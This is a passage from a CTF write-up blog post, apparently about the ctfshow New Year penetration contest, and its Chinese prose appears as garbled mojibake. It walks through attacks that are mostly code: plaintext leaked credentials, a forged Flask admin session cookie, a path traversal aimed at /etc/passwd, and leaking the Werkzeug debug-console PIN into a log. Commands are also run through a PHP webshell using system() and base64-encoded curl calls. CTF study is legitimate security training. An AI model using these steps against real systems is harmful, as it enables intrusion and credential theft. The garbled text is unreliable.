constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span> <span class="token name">lang=</span><span class="token string">"en"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Database TEST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">const</span> <span class="token constant">DATABASE_SECRET_KEY</span> <span class="token operator">=</span> <span class="token string">'0x8F7C71E8E82E4D1E'</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Welcome to Database TEST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>This is a test page for database connection and queries.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database DSN:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter TEST Query:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="é‚®ç®±è¿·äº‘"><a href="#é‚®ç®±è¿·äº‘" class="headerlink" title="é‚®ç®±è¿·äº‘"></a>é‚®ç®±è¿·äº‘</h2><h3 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250104003437954.png" alt="image-20250104003437954"></p><p>ï¼Ÿæµè§ˆå™¨æ’ä»¶é‡Œå‡ºç°äº†ä¸ªæ•°å­—ï¼Œçœ‹äº†ä¸€ä¸‹æ˜¯ä»ç½‘é¡µjsæ¥çš„ï¼Œè¯•ä¸€ä¸‹å±…ç„¶ç§’äº†</p><p>flagï¼š<code>ctfshow&#123;81192&#125;</code></p><h3 id="é¢„æœŸ"><a href="#é¢„æœŸ" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h3><p>æ ¹ç›®å½•ä¸‹æœ‰ &#x2F;secret.txtï¼Œæ˜¯ä¸€ä¸²baseï¼Œè§£ç å¾—åˆ°</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">hacker_ctfshow@163.com/Hacker_ctfsh0w<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç½‘æ˜“äº‘é‚®ç®±çš„è´¦å¯†è¿™æ˜¯ï¼Œåº”è¯¥æ˜¯å¯ä»¥ç›´æ¥ç™»å½•å¾—åˆ°é‚®ä»¶çš„</p><hr><h1 id="ç¬¬å››ç« ï¼ˆFlaskï¼‰"><a href="#ç¬¬å››ç« ï¼ˆFlaskï¼‰" class="headerlink" title="ç¬¬å››ç« ï¼ˆFlaskï¼‰"></a>ç¬¬å››ç« ï¼ˆFlaskï¼‰</h1><h2 id="å†ä¸‹ä¸€åŸ"><a href="#å†ä¸‹ä¸€åŸ" class="headerlink" title="å†ä¸‹ä¸€åŸ"></a>å†ä¸‹ä¸€åŸ</h2><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103195537953.png" alt="image-20250103195537953"></p><p>åœ¨ 172.2.xxx.6:8888 å¼€çš„ flask</p><p>å®¡ä¸€ä¸‹æºç ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> session<span class="token keyword">from</span> flask <span class="token keyword">import</span> url_for<span class="token keyword">from</span> flask <span class="token keyword">import</span> redirect<span class="token keyword">import</span> logging<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> basename<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> joinapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log server is running'</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">check_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/key'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/log_server_key.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            key <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token string">'key'</span><span class="token punctuation">:</span> key<span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/set_log_option'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_log_option</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logName <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logName'</span><span class="token punctuation">)</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    app_log <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span>logName<span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>FileHandler<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>    clear_log_file<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log option set successfully'</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/get_log_content'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_log_content</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">,</span> basename<span class="token punctuation">(</span>logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log content'</span><span class="token punctuation">,</span> <span class="token string">'content'</span><span class="token punctuation">:</span> content<span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">clear_log_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åªéœ€è¦ä¼ªé€  session ä¸º admin å°±è¡Œäº†ï¼š<code>eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU</code></p><p>ä½†æ˜¯åœ¨å“ªä¼ å‘¢ï¼Œæµ‹äº†ä¸€ä¸‹å‘ç°ä»»åŠ¡ä¸­å¿ƒä¸å‡ºç½‘</p><p>çœ‹æ¥è¦æŠŠphpé‚£å°æœºå­æ‹¿ä¸‹shellæ‰èƒ½æ‰“</p><p>å¼€äº†debugæ¨¡å¼ï¼Œå¯ä»¥è®¿é—®console</p><br><p>phpé‚£å°æœåŠ¡å™¨æœ‰curlï¼Œç›´æ¥curlå°±è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token number">172.2</span>.227.6:8888/key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250106174441782.png" alt="image-20250106174441782"></p><p>flagï¼š<code>ctfshow&#123;4f5d1d5d-1d5d-1d5d1d5d1d5d&#125;</code></p><hr><h2 id="é¡ºè—¤æ‘¸ç“œï¼ˆå¤ç°ï¼‰"><a href="#é¡ºè—¤æ‘¸ç“œï¼ˆå¤ç°ï¼‰" class="headerlink" title="é¡ºè—¤æ‘¸ç“œï¼ˆå¤ç°ï¼‰"></a>é¡ºè—¤æ‘¸ç“œï¼ˆå¤ç°ï¼‰</h2><p>æ¥ä¸‹æ¥å…³æ³¨è¿™ä¸ªï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/set_log_option'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_log_option</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logName <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logName'</span><span class="token punctuation">)</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    app_log <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span>logName<span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>FileHandler<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>    clear_log_file<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log option set successfully'</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/get_log_content'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_log_content</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">,</span> basename<span class="token punctuation">(</span>logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log content'</span><span class="token punctuation">,</span> <span class="token string">'content'</span><span class="token punctuation">:</span> content<span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">clear_log_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„é€ curl</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token number">172.2</span>.227.6:8888/set_log_option?logFile<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd%2526logName<span class="token operator">=</span><span class="token number">1</span><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token number">172.2</span>.227.6:8888/get_log_content?logFile<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å°è¯•åˆ©ç”¨<code>clear_log_file</code>ç›´æ¥è¯» &#x2F;etc&#x2F;passwdï¼Œä½†æ˜¯å‰é¢è¦å†™æ—¥å¿—åˆ°æ–‡ä»¶ä¸­ï¼Œæ˜æ˜¾æƒé™ä¸è¶³</p><p>æƒ³åˆ°è¿˜æœ‰ consoleï¼Œä½†æ˜¯æ²¡æœ‰PINç ï¼Œæ€ä¹ˆåŠå‘¢</p><p>å› ä¸ºè¿™é‡Œæœ‰ logging åº“ï¼Œå¯ä»¥æŠŠæ§åˆ¶å°æ‰“å°çš„ä¸œè¥¿ä¿å­˜ä¸‹æ¥ï¼Œè€Œæˆ‘ä»¬è®¿é—®<code>/console?__debugger__=yes&amp;cmd=printpin&amp;s=SECRET</code>æ—¶ä¼šæŠŠPINç æ‰“å°åœ¨æ§åˆ¶å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥æŠŠPINç å†™åˆ°æ—¥å¿—</p><p>é‚£ä¹ˆå…ˆè·å–consoleçš„keyï¼Œç›´æ¥è®¿é—®consoleï¼Œåœ¨è¿”å›çš„htmlä¸­å°±æœ‰ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token number">172.2</span>.186.6:8888/console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113120057969.png" alt="image-20250113120057969"></p><p>ç„¶åè®¾ç½®æ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.2.186.5/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'curl -b  "session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3CODA.xtpnmtcEw-pXdixnj36DDm51-FY" "http://172.2.186.6:8888/set_log_option%3flogName=werkzeug%2526logFile=main.log"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¥ä¸‹æ¥ä½¿æ§åˆ¶å°æ‰“å°å‡ºPINç å†™åˆ°æ—¥å¿—ä¸­ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span>  <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> http://172.2.186.6:8888/console?__debugger__<span class="token operator">=</span>yes<span class="token operator">&amp;</span><span class="token assign-left variable">cmd</span><span class="token operator">=</span>printpin<span class="token operator">&amp;</span><span class="token assign-left variable">s</span><span class="token operator">=</span>64cjjJmRmKNv647oy994<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œå¯ä»¥å¯¹å‘½ä»¤è¿›è¡Œç¼–ç æ¥é¿å…è§£ç é—®é¢˜</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//172.2.186.5/1.php?1=system(base64_decode('Y3VybCAtYiAgInNlc3Npb249ZXlKMWMyVnlJam9pWVdSdGFXNGlmUS5aM2ZSb2cuakRhSXlvQzlzcGF6QUprZ2N3UUlhcGtHSXhVIiAiaHR0cDovLzE3Mi4yLjE4Ni42Ojg4ODgvY29uc29sZT9fX2RlYnVnZ2VyX189eWVzJmNtZD1wcmludHBpbiZzPTY0Y2pqSm1SbUtOdjY0N295OTk0Ig=='));</span><span aria-hidden="true" 